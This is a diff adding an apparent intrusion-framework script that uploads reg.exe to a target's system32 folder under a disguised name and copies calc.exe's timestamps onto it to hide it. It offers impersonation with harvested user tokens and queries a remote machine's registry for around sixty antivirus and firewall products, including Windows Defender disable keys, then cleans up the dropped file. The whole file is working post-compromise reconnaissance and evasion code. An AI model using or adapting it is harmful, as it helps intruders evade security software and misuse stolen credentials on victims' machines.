@@ -1,0 +1,323 @@
+#-------------------------------------------------------------------------------
+# File: r_reg.eps
+# Description: Uploads the reg.exe tool to the targets system32 directory.
+# 27 August 2008  Created....
+#
+#-------------------------------------------------------------------------------
+
+string $ScriptsDir = GetEnv("SCRIPTSDIR");
+string $sSysPath = GetEnv("SYSPATH");
+string $remoteToolName = GetEnv("remoteToolName");
+
+if ($remoteToolName == "") {
+	$remoteToolName="$sSysPath\\cmdl16.exe";
+} 
+
+string $viable;
+string $values;
+
+string $psp;
+string $reg;
+string $os;
+string $osreg;
+
+$psp[0] = "Symantec - Norton Anti-Virus [7.5]";
+$psp[1] = "Symantec - Norton Anti-Virus [2003 - 2008]";
+$psp[2] = "Symantec - Endpoint Protection";
+$psp[3] = "Symantec - Sygate Personal Firewall [5.6]";
+$psp[4] = "McAfee - VirusScan [7.0 - 8.0]";
+$psp[5] = "McAfee - VirusScan [8.0]-> Prevent DLL creation in SYSROOT";
+$psp[6] = "McAfee - VirusScan [8.0]-> Prevent EXE creation in SYSROOT";
+$psp[7] = "McAfee - VirusScan [8.0]-> Prevent DLL creation in SYSTEM32";
+$psp[8] = "McAfee - VirusScan [8.0]-> Prevent EXE creation in SYSTEM32";
+$psp[9] = "McAfee - VirusScan [8.5]";
+$psp[10] = "McAfee - VirusScan [8.5]-> Access Protection Rules";
+$psp[11] = "Kaspersky Lab - Anti-Virus [6]";
+$psp[12] = "Kaspersky Lab - Anti-Virus [6]-> Enviroment";
+$psp[13] = "Kaspersky Lab - Anti-Virus [6]-> Registry Guard";
+$psp[14] = "Kaspersky Lab - Anti-Virus [6]-> Dangerous Behavior";
+$psp[15] = "Kaspersky Lab - Anti-Virus [6]-> Process Injection";
+$psp[16] = "Kaspersky Lab - Anti-Virus [6]-> Process Hiding";
+$psp[17] = "Kaspersky Lab - Anti-Virus [6]-> Behavior Blocking";
+$psp[18] = "Kaspersky Lab - Anti-Virus [7 , 2009]";
+$psp[19] = "Kaspersky Lab - Anti-Virus [7]-> Enviroment";
+$psp[20] = "Kaspersky Lab - Anti-Virus [7]-> Registry Guard";
+$psp[21] = "Kaspersky Lab - Anti-Virus [7]-> Dangerous Behavior";
+$psp[22] = "Kaspersky Lab - Anti-Virus [7]-> Process Injection";
+$psp[23] = "Kaspersky Lab - Anti-Virus [7]-> Process Hiding";
+$psp[24] = "Kaspersky Lab - Anti-Virus [7]-> Behavior Blocking";
+$psp[25] = "8Signs - 8Signs Firewall";
+$psp[26] = "Ahn - Ahn Lab";
+$psp[27] = "ALWIL Software - AVAST! [4.x]";
+$psp[28] = "AVG - Anti-Virus,Anti-Spyware[7.5]";
+$psp[29] = "AVIRA - AntiVir [Classic,Premium,Workstation,Security Suite]";
+$psp[30] = "BitDefender - Total Security [2008]";
+$psp[31] = "BlackIce - Firewall";
+$psp[32] = "Checkpoint - Zone Alarm [Anti-Virus,Firewall,Security Suite 7]";
+$psp[33] = "Comodo - Firwall Pro [3.0]";
+$psp[34] = "Computer Associates - eTrust Security";
+$psp[35] = "Computer Associates - eTrust Internet Security Suite";
+$psp[36] = "Computer Associates - eTrust Anti-Virus [8.4]";
+$psp[37] = "Computer Associates - eTrust Anti-Spyware [9.1]";
+$psp[38] = "Computer Assoicates - eTrust Anti-Spam [5.1]";
+$psp[39] = "Computer Assoicates - eTrust Firewall";
+$psp[40] = "Computer Assoicates - Jinchen Kill";
+$psp[41] = "DrWeb - Anti-Virus, Enterpise Edition";
+$psp[42] = "ESET - Anti-Virus, Smart Security Suite [3.0]";
+$psp[43] = "KingSoft - Internet Security [2008]";
+$psp[44] = "KingSoft - Internet Security [2008]-> Firewall Level Lan";
+$psp[45] = "KingSoft - Internet Security [2008]-> Firewall Level Wide";
+$psp[46] = "KingSoft - Internet Security [2008]-> Anti-Virus Settings";
+$psp[47] = "Microsoft - Antispyware";
+$psp[48] = "Microsoft - Windows Defender";
+$psp[49] = "Microsoft - Windows Defender-> Threat Severity";
+$psp[50] = "Microsoft - Windows Defender-> Real-Time Protection";
+$psp[51] = "Microsoft - Windows Defender-> Disable Key";
+$psp[52] = "Panda Software - Anti Virus [Titanium, Platinium]";
+$psp[53] = "Panda Software - Anti Virus [Lite]-> Product";
+$psp[54] = "Panda Software - Anti Virus [Lite]-> Version";
+$psp[55] = "Panda Software - Administrator [3]";
+$psp[56] = "Rising - AntiVirus [2007,2008]-> Name";
+$psp[57] = "Rising - AntiVirus [2007,2008]-> Version";
+$psp[58] = "SiliVaccine - AntiVirus [2005]";
+$psp[59] = "ThreatFire - Firewall";
+$psp[60] = "Trend Micro - Internet Security [2007]";
+$psp[61] = "Trend Micro - OfficeScan [7.3, 8.0]";
+
+
+
+
+
+$reg[0] = "HKLM\\Software\\Symantec\\Symantec Antivirus\\Install";
+$reg[1] = "HKLM\\Software\\Symantec\\Norton Antivirus\\version";
+$reg[2] = "HKLM\\software\\symantec\\symantec endpoint protection";
+$reg[3] = "HKLM\\software\\Sygate Technologies, Inc.\\Sygate Personal Firewall\\version";
+$reg[4] = "HKLM\\Software\\Network Associates\\ePolicy Orchestrator\\Application Plugins";
+$reg[5] = "HKLM\\software\\network associates\\tvd\\shared components\\on access scanner\\behaviourblocking\\FileBlockEnabled_27";
+$reg[6] = "HKLM\\software\\network associates\\tvd\\shared components\\on access scanner\\behaviourblocking\\FileBlockEnabled_28";
+$reg[7] = "HKLM\\software\\network associates\\tvd\\shared components\\on access scanner\\behaviourblocking\\FileBlockEnabled_29";
+$reg[8] = "HKLM\\software\\network associates\\tvd\\shared components\\on access scanner\\behaviourblocking\\FileBlockEnabled_30";
+$reg[9] = "HKLM\\Software\\McAfee\\ePolicy Orchestrator\\Application Plugins";
+$reg[10] = "HKLM\\software\\McAfee\\VSCore\\On Access Scanner\\BehaviourBlocking\\AccessProtectionUserRules";
+$reg[11] = "HKLM\\Software\\KasperskyLab\\AVP6";
+$reg[12] = "HKLM\\Software\\KasperskyLab\\AVP6\\environment";
+$reg[13] = "HKLM\\software\\kasperskylab\\AVP6\\profiles\\behavior_blocking\\profiles\\pdm\\settings\\bRegMonitoring_Enabled";
+$reg[14] = "HKLM\\Software\\kasperskylab\\AVP6\\profiles\\behavior_blocking\\profiles\\pdm\\settings\\Set\\0000";
+$reg[15] = "HKLM\\Software\\kasperskylab\\AVP6\\profiles\\behavior_blocking\\profiles\\pdm\\settings\\Set\\0002";
+$reg[16] = "HKLM\\Software\\kasperskylab\\AVP6\\profiles\\behavior_blocking\\profiles\\pdm\\settings\\Set\\0003";
+$reg[17] = "HKLM\\software\\kasperskylab\\AVP6\\profiles\\behavior_blocking\\enabled";
+$reg[18] = "HKLM\\software\\kasperskylab\\protected";
+$reg[19] = "HKLM\\software\\kasperskylab\\protected\\AVP7\\environment";
+$reg[20] = "HKLM\\software\\kasperskylab\\protected\\AVP7\\profiles\\behavior_blocking\\profiles\\pdm\\settings\\bRegMonitoring_Enabled";
+$reg[21] = "HKLM\\software\\kasperskylab\\protected\\AVP7\\profiles\\behavior_blocking\\profiles\\pdm\\settings\\Set\\0000";
+$reg[22] = "HKLM\\software\\kasperskylab\\protected\\AVP7\\profiles\\behavior_blocking\\profiles\\pdm\\settings\\Set\\0002";
+$reg[23] = "HKLM\\software\\kasperskylab\\protected\\AVP7\\profiles\\behavior_blocking\\profiles\\pdm\\settings\\Set\\0003";
+$reg[24] = "HKLM\\software\\kasperskylab\\protectedb\\AVP7\\profiles\\behavior_blocking\\enabled";
+$reg[25] = "HKLM\\software\\8signs\\8signs Firewall";
+$reg[26] = "HKLM\\software\\ahnlab";
+$reg[27] = "HKLM\\software\\ALWIL Software\\AVAST";
+$reg[28] = "HKLM\\software\\Grisoft";
+$reg[29] = "HKLM\\software\\Avira";
+$reg[30] = "HKLM\\software\\BitDefender";
+$reg[31] = "HKLM\\software\\Network Ice\\BlackIce";
+$reg[32] = "HKLM\\software\\zone labs\\zone alarm\\CurrentVersion";
+$reg[33] = "HKLM\\software\\comodogroup\\cdi\\1\\product version";
+$reg[34] = "HKLM\\software\\computerassociates\\eTrust Suite Personal";
+$reg[35] = "HKLM\\software\\computerassociates\\eTrust Suite Personal\\Suite\\version";
+$reg[36] = "HKLM\\software\\computerassociates\\eTrust Suite Personal\\AV\\version";
+$reg[37] = "HKLM\\software\\computerassociates\\eTrust Suite Personal\\PP\\version";
+$reg[38] = "HKLM\\software\\computerassociates\\eTrust Suite Personal\\AS\\version";
+$reg[39] = "HKLM\\software\\computerassociates\\eTrust Suite Personal\\pfw\\version";
+$reg[40] = "HKLM\\software\\computerassoicates\\eTrustITM\\CurrentVersion\\Version";
+$reg[41] = "HKLM\\software\\Doctor Web, Ltd";
+$reg[42] = "HKLM\\software\\eset\\eset security\\currentversion\\info";
+$reg[43] = "HKLM\\Software\\Kingsoft\\antispy\\installpath";
+$reg[44] = "HKCU\\Software\\Kingsoft\\antivirus\\KavPFW\\Security Level Lan";
+$reg[45] = "HKCU\\Software\\Kingsoft\\antivirus\\KavPFW\\Security Level Wide";
+$reg[46] = "HKLM\\Software\\Kingsoft\\antivirus\\KWatchSVC";
+$reg[47] = "HKLM\\Software\\GIANTCompany\\AntiSpyware";
+$reg[48] = "HKLM\\Software\\Microsoft\\Windows Defender";
+$reg[49] = "HKLM\\Software\\Microsoft\\Windows Defender\\Threats\\ThreatSeverityDefaultAction";
+$reg[50] = "HKLM\\Software\\Microsoft\\Windows Defender\\Real-Time Protection";
+$reg[51] = "HKLM\\Software\\Microsoft\\Windows Defender\\DisableAntiSpyware";
+$reg[52] = "HKLM\\Software\\panda software\\pavshld\\products";
+$reg[53] = "HKLM\\Software\\panda software\\panda antivirus lite\\product";
+$reg[54] = "HKLM\\Software\\panda software\\panda antivirus lite\\version";
+$reg[55] = "HKLM\\Software\\panda software";
+$reg[56] = "HKLM\\Software\\rising\\rav\\name";
+$reg[57] = "HKLM\\Software\\rising\\rav\\version";
+$reg[58] = "HKLM\\Software\\STS Tech-Service\\SVaccine";
+$reg[59] = "HKLM\\Software\\PCTools\\ThreatFire";
+$reg[60] = "HKLM\\Software\\TrendMicro\\PC-cillin";
+$reg[61] = "HKLM\\Software\\TrendMicro\\PC-cillinNTCorp\\CurrentVersion\\Misc.\\ProgramVer";
+
+
+$os[0] = "Microsoft Windows XP - Professional Service Pack 3";
+
+$osreg[0] = "HKLM\\software\\microsoft\\updates\\windows xp\\sp3";
+
+
+string $split = SplitPath("$remoteToolName");
+
+@echo on;
+
+
+ifnot (prompt "Do you want to upload the tool as \"$remoteToolName\" ?") {
+	$remoteToolName=GetInput("What do you want to upload the tool as?");
+}
+
+ifnot (`put $ScriptsDir\\..\\..\\Tools\\REG.exe -name $remoteToolName`) {
+	echo "File already exists?";
+	return false;
+}
+
+`matchtimes $sSysPath\\calc.exe $remoteToolName`;
+
+string $remotemachine = GetInput("Enter Remote Machine [1.2.3.4 or netbios_name]");
+
+
+ifnot(getViableTokens($viable, $values)) {
+	echo "";
+	echo "---------------------------------";
+	echo "| Couldn't get Exisiting Tokens |";
+	echo "---------------------------------";
+}
+
+echo "";
+echo "";
+echo "";
+
+
+
+int $idx = 0;
+int $j = 0;
+echo "($j). QUIT";
+while($idx < sizeof($viable)) {
+	$j++;
+	echo "($j). Use Token $viable[$idx] ($values[$idx])";
+	$idx++;
+}
+$j++;
+echo "($j). Enter own user";
+$j++;
+echo "($j). Already authenicated (WORKGROUP ZB)";
+
+
+
+
+int $choice = GetInput("Enter the desired option");
+int $j1 = $j;
+$j1--;
+string $user;
+if($choice == 0){
+	if (prompt `del $split[1] -path "$split[0]"`){
+		sleep(300);
+		`dir $split[1] -path "$split[0]"`;
+	}
+	return true;
+}else if($choice == $j) {
+	$user = "";
+}else if($choice == $j1){
+	$user = GetInput("Enter User/Token name");
+}else{
+	$choice--;
+	$user = $viable[$choice];
+}
+	
+
+
+while(prompt "Query target for Registry Key? [DO NOT QUIT, NO WILL STOP SCRIPT EXECUTE CLEANUP]") {
+	int $i = 0;
+	int $ind = 0;
+
+	echo "($i). Quit";
+	while($ind < sizeof($psp)) {
+		$i++;
+		echo "($i). PSP: $psp[$ind]";
+		$ind++;
+	}
+	$ind = 0;
+	while($ind < sizeof($os)) {
+		$i++;
+		echo "($i). OS: $os[$ind]";
+		$ind++;
+	}
+
+
+	$i++;
+	echo "($i). Enter custom query";
+	
+
+	int $regchoice = GetInput("Enter the desired query");
+	string $key;
+
+	
+	if($regchoice == 0){
+		if (prompt `del $split[1] -path "$split[0]"`){
+			sleep(300);
+			`dir $split[1] -path "$split[0]"`;
+		}
+		return true;
+	} else if($regchoice == $i) {
+		$key = GetInput("Enter Reg Key [Ex: HKLM\\Software\\PSP Key]");
+	} else{
+		$regchoice--;
+		if($regchoice < sizeof($psp)) {
+			$key = $reg[$regchoice];
+		}else{
+			int $idx1 = 0;
+			while($idx1 < sizeof($psp)){
+				$regchoice--;
+				$idx1++;
+			}
+			$key = $osreg[$regchoice];
+		}
+	}
+	
+
+	if($user == ""){
+		prompt `run -command "$remoteToolName QUERY \\"$key\\" \\\\$remotemachine" -redirect`;
+	}else{
+		prompt `user=$user run -command "$remoteToolName QUERY \\"$key\\" \\\\$remotemachine" -redirect`;
+	}
+}
+
+if (prompt `del $split[1] -path "$split[0]"`){
+	sleep(300);
+	`dir $split[1] -path "$split[0]"`;
+}
+
+return true;
+
+sub getViableTokens(REF string $token, REF string $value) {
+	@record on;
+	`lpgetenv`;
+	@record off;
+	
+	string $envOption = GetCmdData("option");
+	string $envValue  = GetCmdData("value");
+	
+	ifnot(defined($envOption)) {
+		echo "Unable to list tokens";
+		return false;
+	}
+	string $viableTokens;
+	int $j = 0;
+	int $k = 0;
+	while($j < sizeof($envOption)) {
+		string $temp = split("_USER_", $envOption[$j]);
+		if(sizeof($temp) == 2) {
+			if(strlen($temp[0]) == 0) {
+				$token[$k] = $temp[1];
+				$value[$k] = $envValue[$j];
+				
+				$k++;
+			}
+		}
+		$j++;
+	}
+	return true;
+}
+
+
+#10.11.202.2
